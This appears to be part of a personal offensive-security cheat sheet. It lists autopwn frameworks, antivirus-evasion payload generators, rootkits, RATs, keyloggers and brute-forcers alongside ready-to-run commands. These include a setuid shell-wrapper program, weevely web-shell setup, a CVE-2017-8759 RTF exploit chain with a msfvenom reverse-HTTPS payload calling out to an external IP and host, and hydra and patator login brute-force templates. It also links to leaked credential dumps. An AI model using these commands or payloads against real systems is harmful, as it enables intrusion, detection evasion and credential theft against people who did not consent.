        *   [apt2](https://github.com/MooseDojo/apt2) - *An Automated Penetration Testing Toolkit* - it uses metasploit to automatically enumerate exploits again targets (can import nmap, nessus or nexpose scans) (safety mode can be set) (nmap can be run automatically)

            ``` bash
            msfconsole
            > load msgrpc
            # > load msgrpc ServerHost=127.0.0.1 ServerPort=55552 User=msf Pass=msfpass
            # /usr/share/metasploit-framework/msfrpcd -a 127.0.0.1 -p 55552 -U msf -P msfpass -f # run metasploit rpc as daemon

            vim /usr/share/apt2/default.cfg

            # Print available modules
            ./apt2.py --listmodules

            # Will run nmap automatically:
            ./apt2.py -vv -s 0 --target 10.0.0.2/32
            ./apt2.py -vv -s 0 -C CustomConfig.cfg -f Nmap-Nessus-Nexpose.xml
            ```

*   [routersploit](https://github.com/threat9/routersploit) (kali installation: `apt install routersploit`)

    ```
    rsf > use scanners/autopwn
    rsf (AutoPwn) > set target 192.168.1.1
    rsf (AutoPwn) > run
    ```

* [isf - Industrial Control System Exploitation Framework](https://github.com/dark-lbp/isf) - a exploitation framework based on Python
* [***fuzzbunch***](https://github.com/fuzzbunch/fuzzbunch) - NSA finest tool - brilliant analog of metasploit leaked from NSA
    <br> INSTALLATION ! [fuzzbunch-debian](https://github.com/mdiazcl/fuzzbunch-debian) - fuzzbunch deployment for debian
    <br> [usage example](https://www.hackingtutorials.org/exploit-tutorials/eternalromance-exploiting-windows-server-2003/)
    <br> [Powershell Empire и FuzzBunch: эксплуатация нашумевшей уязвимости EternalBlue](https://habr.com/company/pentestit/blog/327490/)

* [monkey (ghub)](https://github.com/guardicore/monkey) - an automated pentest tool (another autopwn)

<br>

* [core security, core impact](https://www.coresecurity.com/core-impact) - smth like metasploit, with GUI (but its usage is thoroughly watched by NSA, it is hard to get it)
* [CANVAS (Immunity)](https://www.immunityinc.com/products/canvas/)
* [SAINTexploit](http://www.saintcorporation.com/products/penetration-testing/)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### Antivirus bypass

---

Articles:

* [Art of Anti Detection 1 – Introduction to AV & detection techniques](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/)
* [Art of Anti Detection 2 – Backdoor manufacturing](https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/)
* [Детект песочницы. Учимся определять, работает ли приложение в sandbox-изоляции](https://xakep.ru/2018/02/27/detect-sandbox/)

Tools:

* [Cminer](https://github.com/EgeBalci/Cminer) - a tool for enumerating the code caves in PE files.
    <br> ***code cave*** is a place in executable which does not contain any data and can be used for storing a payload.
<!-- [Laragon](https://laragon.org/download/) - portable local server -->
* [Execute Mimikatz Inside of RegSvcs or RegAsm - .NET utilities Proof of Concept](https://gist.github.com/aventado/2041f04d9e9b94dbac99)

**Auto anti-evasion tools**:

* [spookflare](https://artofpwn.com/spookflare.html), [spookflare (github)](https://github.com/hlldz/SpookFlare) - can generate meterpreter reverse HTTP/HTTPS x86/x64 and bypass modern antiviruses (january 2018)
    <br> *([SpookFlare (RU)](http://telegra.ph/SpookFlare-instrument-generacii-fajla-dlya-obhoda-AV-07-26), [статья про SpookFlare (RU)](http://telegra.ph/Obhod-antivirusa-na-segodnyashnij-den-ni-odin-iz-antivirusov-ne-palit-sessiyu-meterpreter-01-22))*

* [Veil 3.0  Framework](https://github.com/Veil-Framework/Veil) (veil-evasion) - tool designed to generate metasploit payloads that bypass common anti-virus solutions.
* [ebowla](https://github.com/Genetic-Malware/Ebowla) - targeted at making payloads undetectable (ebowla - Ethnic Bio Weapon Limited Access)
* [go-mimikatz](https://github.com/vyrus001/go-mimikatz) - a wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion.

<br>

* `-x` flag for msfvenom in order to use custom template
* [www.shellterproject.com](https://www.shellterproject.com/), [shellter (kali)](https://tools.kali.org/maintaining-access/shellter) - a dynamic shellcode injection tool (PE, 32bit)
* [The Backdoor Factory (BDF)](https://github.com/secretsquirrel/the-backdoor-factory) (not maintained since 2016-2017) - patch PE, ELF, Mach-O binaries with shellcode.
* manual injection example: [injecting spyware in an EXE](http://resources.infosecinstitute.com/injecting-spyware-exe-code-injections/#gref)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### exploit databases

---

* ***[searchsploit](https://www.exploit-db.com/searchsploit/)*** - tool for searching exploits on [exploit-db.com](http://www.exploit-db.com) locally
* ***[popmem](https://github.com/rfunix/Pompem)*** - exploit and vulnerability finder (searches through PacketStorm security, CXSecurity, ZeroDay, Vulners, National Vulnerability Database, WPScan Vulnerability Database, ...)
* ***[searchscan](https://github.com/averagesecurityguy/searchscan)*** - search nmap and metasploit scanning scripts

<br>

* [exploitsearch.net](http://www.exploitsearch.net/) - exploits aggregator
* [exploit-db.com](http://www.exploit-db.com/) - offensive security exploit db
* [vuldb.com](https://vuldb.com/)
* [0day.today](http://en.0day.today/) - exploit database (free and paid)

<br>

* [Vulners](https://vulners.com/search) - vulnerability database with smart search and machine-readible output
* [rapid7 metasploit modules](http://www.rapid7.com/db/modules/) - vulnerability database and metasploit exploits database
* [kernel-exploits.com](https://www.kernel-exploits.com/) - kernel linux exploits for privilege escalation
* [cxsecurity.com](http://cxsecurity.com/) - vulnerabilities database
* [WPScan Vulnerability Database](https://wpvulndb.com/) - wordpress vulnerability db
* [securitylab.ru (RU)](https://www.securitylab.ru/poc/) - search for exploits/vulnerabilities

<br>

* search for CVE: [cvedetails.com](http://www.cvedetails.com/), [NVD](https://web.nvd.nist.gov/view/vuln/search), [mitre](https://cve.mitre.org/cve/cve.html)
* [virusshare.com](https://virusshare.com/) - viruses db

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### Linux privilege escalation

---

Cheatsheets:

* [Linux Unix Bsd Post Exploitation](http://attackerkb.com/Unix/LinuxUnixBSD_Post_Exploitation)
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Privilege Escalation on Linux with Live examples](http://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref)

Linux kernel exploits:

* [xairy/linux-kernel-exploitation](https://github.com/xairy/linux-kernel-exploitation#exploits)
* [lucyoa/kernel-exploits (github)](https://github.com/lucyoa/kernel-exploits)
* [SecWiki/linux-kernel-exploits (github)](https://github.com/SecWiki/linux-kernel-exploits)
* [Privilege Escalation](https://github.com/AusJock/Privilege-Escalation) - contains common local exploits and enumeration scripts ([PrivEsc Linux](https://github.com/AusJock/Privilege-Escalation/tree/master/Linux))

Instruments:

* [linuxprivchecker (python)](https://www.securitysift.com/download/linuxprivchecker.py)
* [LinEnum (sh)](https://github.com/rebootuser/LinEnum) ([high-level summary of the checks/tasks performed by LinEnum](http://www.rebootuser.com/?p=1758))
* [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
    <br> [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check) - old
* [linux-exploit-suggester (sh)](https://github.com/mzet-/linux-exploit-suggester)
* [Linux exploit suggester (perl)](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
* [Dirty cow](https://dirtycow.ninja/) - (CVE-2016-5195) - Linux Privilege Escalation vulnerability ([dirtycow PoC](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs))
* {:.dummy} [Overlayfs privilege escalation](https://www.exploit-db.com/exploits/39166/) - linux kernel <= 4.3.3
* {:.dummy} [exploit-suggester](http://pentestmonkey.net/tools/audit/exploit-suggester) - suggest exploits for Solaris
* [SecWiki/android-kernel-exploits](https://github.com/SecWiki/android-kernel-exploits)
* [SecWiki/macos-kernel-exploits](https://github.com/SecWiki/macos-kernel-exploits)

<br>

* [chw00t](https://github.com/earthquake/chw00t) - chroot escape tool (most of the technics require root)

<br>

* `cat /etc/crontab/`
* `cat /etc/passwd | grep bash | cut -d ':' -f 1` - get all users with bash login
* `sudo -l` - get commands, available to run
* installed packages: `dpkg --get-selections | grep "\sinstall$"` `dpkg-query -W -f='${Package} ${Version} ${Architecture}\n'`

*   suid-bit utilization

    <div class="spoiler"><div class="spoiler-title">
    <i>Program for chaning effective uid</i>
    </div><div class="spoiler-text" markdown="1">

    ``` c++
    #include <sys/types.h>
    #include <unistd.h>
    #include <stdlib.h>

    int main (int argc, char** argv) {

        uid_t euid = geteuid();
        setuid(euid);
        gid_t egid = getegid();
        setgid(egid);

        system(argv[1]);

        return 0;
    }
    ```

    </div></div>

Articles about basic linux privilege escalation:

* {:.dummy} [linux privilege escalation scripts](http://netsec.ws/?p=309) - 3 scripts for detecting possibilities for privilege escalation (LinEnum, LinuxPrivChecker, g0tmi1k’s Blog)

#### Linux containers / docker

* [Abusing Privileged and Unprivileged Linux Containers (2016)](https://www.nccgroup.trust/us/our-research/abusing-privileged-and-unprivileged-linux-containers/)
    <br> Compile from inside: `gcc -g -Wall secopenchroot.c -o secopenchroot`
    <br> Run: `./secopenchroot /tmp "02 00 00 00 00 00 00 00"`

**Docker security**:

* [docker security](https://docs.docker.com/engine/security/security/)
* [cr0hn/dockerscan](https://github.com/cr0hn/dockerscan) - docker attacking (firstly) and analysis tools
* [coreos/clair](https://github.com/coreos/clair) - static analysis of vulnerabilities in application containers 
* [docker security scanning](https://docs.docker.com/docker-cloud/builds/image-scan/)
* [docker/docker-bench-security](https://github.com/docker/docker-bench-security) - a script that checks for dozens of common best-practices around deploying Docker containers in production

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### postexploitation / backdoors / RAT

---

[Пак исходников руткитов](https://helpugroup.ru/pak-ishodnikov-rutkitov/) - rootkits sources list

* [tsh](https://github.com/creaktive/tsh) (linux) - tinyshell - an open-source UNIX backdoor that compiles on all variants, has full pty support, and uses strong crypto for communication
* [weevely3](https://github.com/epinna/weevely3) ([wiki](https://github.com/epinna/weevely3/wiki#getting-started)) - weaponized web shell (supports only php)
    <br> `./weevely.py generate password agent.php` (check more flags) - generate agent.php
    <br> `./weevely.py http://target/agent.php password` - remote connect

<br>

* [brootkit](https://github.com/cloudsec/brootkit) - lightweight rootkit implemented by bash shell scripts v0.10
* [beurk](https://github.com/unix-thrust/beurk) - experimental Unix rootkit
* [some backdoors](https://github.com/nullsecuritynet/tools/tree/master/backdoor)
* [0xb4ckd00r](https://github.com/sch3m4/0xb4ckd00r) - backdoor written in asm
* Key loggers (*this list must be improved to proper condition*):
    <br> [logkeys](https://github.com/kernc/logkeys) - a GNU/Linux keylogger 
    <br> [Simple Python Keylogger](https://sourceforge.net/p/pykeylogger/wiki/Main_Page/)
    <br> SC-KeyLog
    <br> [ixkeylog](https://github.com/dorneanu/ixkeylog) - a X11 keylogger for Unix that basically uses xlib to interact with users keyboard
    <br> [sniffMK](https://github.com/objective-see/sniffMK) - MacOS keylogger (+ mouse)
    <br> somehow `msgina.dll` can be changed on some keylogger to log user's password

Windows:

* [sbd](http://sbd.sourceforge.net/) (windows) - secure backdoor
* [QuasarRAT](https://github.com/quasar/QuasarRAT/releases) - remote administration tool for windows
* [pupy](https://github.com/n1nj4sec/pupy/) - opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python
* [Stitch](https://github.com/nathanlopez/Stitch)
* [outis](https://github.com/SySS-Research/outis) - outis is a custom Remote Administration Tool (RAT) or something like that. It was build to support various transport methods (like DNS) and platforms (like Powershell).

<br>

* Botnets:
    <br> [lizkebab botnet](https://github.com/ifding/iot-malware/tree/master/lizkebab)
    <br> more: [iot-malware](https://github.com/ifding/iot-malware) - malware source code samples leaked - BE ACCURATE!!

article: [Modern linux rootkits 101](https://turbochaos.blogspot.ru/2013/09/linux-rootkits-101-1-of-3.html)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### concealment

* [ropeadope](https://github.com/nullsecuritynet/tools/tree/master/logcleaner/ropeadope) - a Linux logcleaner

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## APT - Advanced Persistent Thread

---

* Stealing NetNTLM hashes:

    * BadPDF
    * LRM - Left-to-Right mark (pdf.exe vs exe.pdf)
    * `.scf`, `.url`, `file://` (OWA), ... - [see more at]({{ "/infosec/windows.html#honeypot-likemitm-tools" | prepend: site.baseurl }})
    * malicious macros

* `msf> search exploit/windows/fileformat/adobe_pdf_embedded_exe` - embed shellcode into pdf
* *CVE-2017-8759* - insert shellcode into *.rtf* (last time I tested it under windows 10 - it worked perfectly)
    
    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *[PoC for infecting rtf (github poc)](https://github.com/bhdresh/CVE-2017-8759):*
    </div><div class="spoiler-text" markdown="1">
    * generate malicious RTF file `python cve-2017-8759_toolkit.py -M gen -w report-2017.rtf -u http://back-connect.com/logo.txt`
    * embed `.exe` into OLE Packager.dll function: [CVE-2018-0802](https://github.com/rxwx/CVE-2018-0802/blob/master/packager_exec_CVE-2018-0802.py)
    * (Optional, if using MSF Payload) : Generate metasploit payload and start handler: `msfvenom -p windows/meterpreter/reverse_https LHOST=195.16.61.232 LPORT=443 -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -i 15 -e x86/shikata_ga_nai > /tmp/meter-reverse-https.exe`
    * Start toolkit in exploit mode to deliver local payload: `python cve-2017-8759_toolkit.py -M exp -e http://back-connect.com/logo.txt -l /tmp/meter-reverse-https.exe`
    </div></div>

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## BruteForce

---

**Cracking archives/documents(word/...)/pdf/...**:

* [Passware Kit Forensic](https://www.passware.com/kit-forensic/) (2017 can be found on torrents)
* [ElcomSoft Distributed Password Recovery](https://www.elcomsoft.ru/edpr.html)

**Utilities**:

* <u>Online bruteforce</u>:

    Automatization and wide-range brute-attack: ***[brutespray](https://github.com/x90skysn3k/brutespray)*** - brutespray imports nmap scans and bruteforce services

    * `xfreerdp /v:10.0.0.2:3389 -sec-nla /u:""` - enumerate/list windows users through rdp
    *   [***THC Hydra***](https://github.com/vanhauser-thc/thc-hydra) – brute force attack on a remote authentication services <small>(adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp)</small>
        <br> [hydra comparison of features and services coverage](https://www.thc.org/thc-hydra/network_password_cracker_comparison.html)
        <br> `hydra http-form-post -U` - module help
        <br> `hydra -4uF -t 4 -o /tmp/brute-log.txt ...` - template
        <br> `hydra -v -t 32 -l root -P dict.txt -o ~/recovered.txt 10.0.0.1 -s 2222 ssh`
        <br> `hydra -v -t 32 -L usernames.txt -P dict.txt -o ~/recovered.txt 10.0.0.1 -s 2222 ssh`

        <div class="spoiler"><div class="spoiler-title">
        <i>more usage examples</i>
        </div><div class="spoiler-text" markdown="1">
        ***http-form-post***

        ***http-get*** - basic authentication: `hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/`
        </div>
        </div>

    * [***medusa***](https://github.com/jmk-foofus/medusa) - login bruteforcer <small>(cvs, ftp, http, imap, mssql, mysql, nntp, pcanywhere, pop3, postgres, rexec, rlogin, rsh, smbnt, smtp-vrfy, smtp, snmp, svn (subversion), telnet, vmauthd (VMware authentication daemon), vnc, web-form, wrapper (generic wrapper))</small>
        <br> `medusa -d` - display currently installed modules
        <br> `medusa -M http -q` - module help
        <br> `medusa -T 10 -t 5 -L -F -O /tmp/brute-log.txt -u root -P dict.txt -h 10.0.0.2 -M ssh` - template

    * [***patator***](https://github.com/lanjelot/patator) - login bruteforcer <small>(ftp_login, ssh_login, telnet_login, smtp_login, smtp_vrfy, smtp_rcpt, finger_lookup, http_fuzz, ajp_fuzz, pop_login, pop_passd, imap_login, ldap_login, smb_login, smb_lookupsid, rlogin_login, vmauthd_login, mssql_login, oracle_login, mysql_login, mysql_query, rdp_login, pgsql_login, vnc_login, dns_forward, dns_reverse, snmp_login, ike_enum, unzip_pass, keystore_pass, sqlcipher_pass, umbraco_crack, tcp_fuzz, dummy_test)</small>

        <div class="spoiler"><div class="spoiler-title">
        <i>usage examples</i>
        </div><div class="spoiler-text" markdown="1">
        ***http_fuzz***: `patator http_fuzz url=http://10.0.0.3/wp-login.php method=POST body='login=FILE0&pwd=MyPassword&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwebsite_backend%2Fwp-admin%2F&testcookie=1' before_urls=http://10.0.0.3/wp-login.php 0=/path/to/usernames accept_cookie=1 follow=1 -x ignore:fgrep='Invalid username.'`

        ***http_fuzz***: `patator http_fuzz url=http://10.0.0.3/wp-login.php method=POST body='login=admin&pwd=FILE0&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwebsite_backend%2Fwp-admin%2F&testcookie=1' before_urls=http://10.0.0.3/wp-login.php 0=/path/to/passwords accept_cookie=1 follow=1 -x ignore:fgrep='Wrong username or password' --rate-limit=0 -t 6`

        ***ftp***: `patator ftp_login host=10.0.0.2 user=FILE0 password=FILE1 0=/path/to/usernames 1=/path/to/passwords -x ignore:mesg='Permission denied.' -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500`

        ***snmp_login***: `patator snmp_login host=10.0.0.2 version=3 user=FILE0 0=/path/to/usernames -x ignore:mesg=unknownUserName` - snmp login enumeration
        <br> ***snmp_login***: `patator snmp_login host=10.0.0.2 version=3 user=admin auth_key=FILE0 0=/path/to/passwords -x ignore:mesg=wrongDigest` - snmpv3 password enumeration

        ***smb***: `patator smb_login host=10.0.0.2 user=FILE0 password=FILE1 0=/path/to/usernames 1=/path/to/passwords -x ignore:fgrep=STATUS_LOGON_FAILURE`
        </div>
        </div>

    * [***ncrack***](https://nmap.org/ncrack/) - login bruteforcer <small>(SSH, RDP, FTP, Telnet, HTTP(S), POP3(S), IMAP, SMB, VNC, SIP, Redis, PostgreSQL, MySQL, MSSQL, MongoDB, Cassandra, WinRM, OWA)</small>
        <br> `ncrack -T3 ...` - template
        <br> `ncrack -v -T5 -g cl=10 -u phonexicum -P /path/to/passwords 10.0.0.2 -p 22,ftp:3210,telnet`

    * [***crowbar***](https://github.com/galkan/crowbar) - it is developed to support protocols that are not currently supported by thc-hydra, ... <small>(openvpn, rdp, sshkey, vnckey)</small>
        <br> `crowbar.py -n 10 -b rdp -u username -C /path/to/passwords -s 10.0.0.2/32 -p 3389`
    * [osueta](https://github.com/c0r3dump3d/osueta) - ssh timing attack - user enumeration
        <br> `osueta.py -l 1000 -H 172.16.0.12 -p 22 -L /path/to/usernames -v yes`

    [blog.g0tmi1k.com/dvwa/login](https://blog.g0tmi1k.com/dvwa/login/) - using hydra or patator for online bruteforce with respect to CSRF token
    <br>[g0tmi1k/boot2root-scripts (github)](https://github.com/g0tmi1k/boot2root-scripts) - scripts for brute with respect to CSRF token

    [medusa, hydra, ncrack comparison](http://foofus.net/goons/jmk/medusa/medusa-compare.html)

    Some fuzzers:

    * {:.dummy} [ftp-fuzz, tftp-fuzz, oniofuzz](https://github.com/nullsecuritynet/tools/tree/master/fuzzer)
    * {:.dummy} [XBruteForcer](https://github.com/Moham3dRiahi/XBruteForcer) - WordPress (autodetect username), Joomla, DruPal, OpenCart, Magento

    <br>

* <u>Offline bruteforce</u>:

    * ***[hashcat](https://hashcat.net/hashcat/)*** - advanced password recovery (OpenCL (video card)) ([hashcat + oclHashcat = hashcat (RU)](https://hackware.ru/?p=1224))
        <br> ***[trustedsec/hate_crack](https://github.com/trustedsec/hate_crack)*** - a tool for automating cracking methodologies through Hashcat from the TrustedSec team.

        * `hashcat64.exe -I` - get available OpenCL devices
        * `hashcat64.exe -m 100 -b` - benchmark specific hash
        * `hashcat64.exe -m 100 -w 3 -a 0 -o D:\_recovered.txt D:\hashes.txt D:\dicts\rockyou.txt` - brute through wordlist
        * `hashcat64.exe -m 100 -w 3 -a 3 -o D:\_recovered.txt D:\hashes.txt ?a?a?a?a?a?a` - brute by mask

        My favourite flags:
        
        * `-m 2500 -w 4 --status --status-timer=10` - wifi

        Specific flags:

        * `-w1-4` - set of hardware load
        * `--status --status-timer=10` - automatically update status every X seconds
        * `-j ">8"` - will find hashes with length of 10 and bigger (see more rules [here](https://hashcat.net/wiki/doku.php?id=rule_based_attack#rules_used_to_reject_plains))
        * `--potfile-disable` - disable potfile (handy for *debug* runs)
        * `--session=last` - save under session "last" - `hashcat64.exe --session=last --restore` - restore session "last"
        * etc...

    * [***JohnTheRipper***](http://www.openwall.com/john/) - password cracker (cpu only) ([JohnTheRipper hash formats (pentestmonkey)](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats))
        <br> get saved hashes: `grep 5d41402abc4b2a76b9719d911017c592 ~/.john/john.pot`
        <br> [rsmangler](https://github.com/digininja/RSMangler) - take a wordlist and perform various manipulations on it similar to those done by John the Ripper (looks like copy of JohnTheRipper's permutator)

    * [***ophcrack***](http://ophcrack.sourceforge.net/) - a free ***Windows password cracker*** based on *rainbow tables*. It is a very efficient implementation of rainbow tables done by the inventors of the method. It comes with a Graphical User Interface and runs on multiple platforms.

    * [sucrack](http://www.leidecker.info/projects/sucrack.shtml) - bruteforce passwords on local machine

    * {:.dummy} [L0phtCrack 7](http://www.l0phtcrack.com/) - (after v7 it become much-more faster and expensive) – attempts to crack Windows passwords from hashes which it can obtain (given proper access) from stand-alone Windows workstations, networked servers, primary domain controllers, or Active Directory.

* <u>Other</u>

    * ***Online services***: ([top10 best hash-cracking services (raz0r.name)](http://raz0r.name/obzory/top-10-luchshix-onlajn-servisov-po-rasshifrovke-xeshej/))

        Good online services for hash recovery:
        
        * [cmd5](http://www.cmd5.ru/) - paid service, but it is *worthwhile*
        * [hachkiller](https://www.hashkiller.co.uk/)
        * [gpuhash.me](https://gpuhash.me/)
        * [hashes.org](https://hashes.org/search.php) ([hashes.org leaks](https://hashes.org/leaks.php))

        <div class="spoiler"><div class="spoiler-title">
        <i>more online services (this list becomes obsolete very fast)</i>
        </div><div class="spoiler-text" markdown="1">

        * free-of-charge:

            * [wpa-sec.stanev.org](http://wpa-sec.stanev.org/)
            * [wpa.darkircop.org](http://wpa.darkircop.org/)
            * [www.onlinehashcrack.com](http://www.onlinehashcrack.com) (simple passwords - for free, others - not)
        
        * paid:

            * [psk.do.am](http://psk.do.am)
            * [gpuhash.me](http://www.gpuhash.me/)
            * [cloudcracker.com](https://www.cloudcracker.com)
            * [tools.question-defense.com](http://tools.question-defense.com/wpa-password-cracker/) - wpa
            * [airslax.com](http://airslax.com)
            * [xsrc.ru](http://xsrc.ru)
            * [www.hashkiller.co.uk/](http://www.hashkiller.co.uk/wpa-crack.aspx)

        </div>
        </div>

        <br>

    * [woraauthbf_0.22R2](https://soonerorlater.hu/index.html?article_id=513) – the Oracle password cracker
    * {:.dummy} [fcrackzip](http://oldhome.schmorp.de/marc/fcrackzip.html) [source code](https://github.com/hyc/fcrackzip) - bruteforce zip-archives

**Wordlists**:

*[(RU) Создание и нормализация словарей. Выбираем лучшее, убираем лишнее](https://habrahabr.ru/company/pentestit/blog/337718/)*

* **most popular**:

    * kali-linux builtin: `/usr/share/wordlists/`
    * metasploit builtin: `/usr/share/metasploit-framework/data/wordlists`
    * *rockyou*, *john*, *cain&abel*, ... Collection of most popular (and leaked): **[wiki.skullsecurity.org passwords](https://wiki.skullsecurity.org/index.php?title=Passwords)**
    * [droope/pwlist](https://github.com/droope/pwlist/) - *ssh* bruteforce wordlist (from smbd's ***honeypot***)
    * [aircrack](https://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists)

    * [statistically likely usernames](https://github.com/insidetrust/statistically-likely-usernames)

* **default passwords**, **default logins**, **default credentials**:

    * tools:

        * [`nmap --script http-default-accounts ...`](https://nmap.org/nsedoc/scripts/http-default-accounts.html)
        * [changeme](https://github.com/ztgrace/changeme)
            <br> `./changeme.py 10.0.0.0/8 --all -t 10`, `./changeme.py --dump` - print loaded credentials
            <br> Target to scan - can be IP, subnet, hostname, nmap xml file, text file or proto://host:port
        * [***pwdsearch***](https://github.com/nikallass/pwdsearch) - a huge grepable collection of passwords

    *   <div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
        <i>devices:</i>
        </div><div class="spoiler-text" markdown="1">
    
        * [default-password.info](https://default-password.info/)
        * [open-sez.me](http://open-sez.me/)
        * [defaultpasswords.in](http://defaultpasswords.in/)
        * [www.default-password.net](https://web.archive.org/web/20161112160522/http://www.default-password.net:80/vendors) (web archive)
        * [routerpasswords.com](http://www.routerpasswords.com/) - routers
        * [fortypoundhead.com](http://www.fortypoundhead.com/tools_dpw.asp)
        * [cirt.net](https://cirt.net/passwords) - default passwords ([passhunt](https://github.com/Viralmaniar/Passhunt) - search tool for this site)
        * [www.defaultpassword.com](http://www.defaultpassword.com/)
        * [www.bestvpn.com](https://www.bestvpn.com/guides/default-router-login-details/#)

        </div></div>

    *   <div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
        <i>SCADA:</i>
        </div><div class="spoiler-text" markdown="1">

        * [SCADA Default Password (SDPD)](http://www.critifence.com/default-password-database/)
        * [Default Passwords for Nearly Every SCADA System](https://www.hackers-arise.com/single-post/2016/09/21/Scada-Hacking-Default-Passwords-for-Nearly-Every-SCADA-System)

        </div></div>

    * [default-passwords (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/default-passwords.csv)
    * [default accounts wordlist](https://github.com/milo2012/pentest_scripts/tree/master/default_accounts_wordlist)
    * [netbiosX/Default-Credentials](https://github.com/netbiosX/Default-Credentials)
    * [tenable: plugins: Default unix accounts](https://www.tenable.com/plugins/index.php?view=all&family=Default+Unix+Accounts)
    * [default password list (2007-07-03)](http://www.phenoelit.org/dpl/dpl.html)

* **various generated wordlists, processed by some very hard-working guyes**:

    * [WiFiMap](https://github.com/beardache/WiFiMap) - tool for dumping passwords from *wifimap*
        <br> [WhyFi](https://github.com/beardache/WhyFi) - database dumped in 2017
    * [berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists) - wordlists sorted by probability originally created for password generation and testing (*isn't it the most popular today?*)
    * [crackstation.net](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm) - the guy collected in one file all passwords he could find in the world (was it in 2010 ?)
    * [SecLists](https://github.com/danielmiessler/SecLists) - collection of wordlists for ***fuzzing*** (passwd, usernames, pattern-matching, URLs, fuzzing payloads, etc.)
    * [fuzzdb](https://github.com/fuzzdb-project/fuzzdb) - good database for fuzzing
    * [weakpass.com](http://weakpass.com/) - ***very gui-friendly interface***
    * [gitdigger](https://github.com/wick2o/gitdigger) - creating realworld wordlists from github hosted data.

* **enormous collections of logins/passwords raw data**:

    * *[torrent magnet uri](magnet:?xt=urn:btih:85F39F1D94917D61277725E7DA85D8177A5C12EB&dn=leaks) - 600 GB database of logins/passwords from **darknet***
    * [databases.today](https://databases.today/search.php) - free-to-download 60GB collection of publicly available leaked password databases (all dbs: [list of all these databases](https://publicdbhost.dmca.gripe/))
    * [Dictionaries + Wordlists (blog.g0tmi1k.com)](http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists)

* **bruteforcing masks**

    * [PathWell Topologies (korelogic blog)](https://blog.korelogic.com/blog/2014/04/04/pathwell_topologies)

* **password analysis**

    * [pwdlyser](https://www.pwdlyser.com/) - password analysis and reporting tool

* [wordlists.capsop.com](https://wordlists.capsop.com/)
* [openwall.com/pub/wordlists](http://download.openwall.net/pub/wordlists/), [openwall.com/pub/wordlists (ftp)](ftp://ftp.openwall.com/pub/wordlists/) - open collection from openwall for brute (exist bigger collection, but it is paied)
* [Ingles-50M.zip](https://mega.nz/#!NB0CSTxS!xJLGfD119hR7WNMt-YAWHMqdLh1cHAtIH6FMQZBJ_3M)
* [duyetdev/bruteforce-database](https://github.com/duyetdev/bruteforce-database)
* [siph0n.net](http://siph0n.net/hashdump.php)
* [Dormidera/Passwords](https://github.com/Dormidera/Passwords) - german, arabe, spanish, numbers, ...

*[antichat.ru](https://forum.antichat.ru/threads/13640/page-12)* - парни на форуме постят ссылки на словари
<br> *[archihacker.hop.ru](http://archihacker.hop.ru/slovari_dly_bruta.html)* - словари для брута

<br>

*Web-sites having big leaked databases (though they will not share them)*:

* [dumpedlqezarfife.onion.lu](http://dumpedlqezarfife.onion.lu/)
* [weleakinfo.com](https://weleakinfo.com/)
* [leakedsource.ru](https://leakedsource.ru/)
* [haveibeenpwned.com](https://haveibeenpwned.com/)

<br>

**Rulesets**:

[pw-inspector](https://tools.kali.org/password-attacks/hydra) - reads passwords in and prints those which meet the requirements

* [John The Ripper - rules](http://openwall.info/wiki/john/rules) - some rulesets for john-the-ripper
* [KoreLogic](http://contest-2010.korelogic.com/rules.html) - custom rules for generating wordlists (KoreLogic - a password cracking contest)

<br>

**Wordlists generators**:

* [cewl (digi.ninja cewl)](https://digi.ninja/projects/cewl.php) - custom word-list generator (generates wordlists based on parsed web-site (spiders a given url to a specified depth, optionally following external links, and returns a list of words))
    <br> generate wordlist: `cewl -d 3 -m 4 -w /home/phonexicum/Desktop/cewl-10.3.txt http://10.0.0.3/ -u "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"`
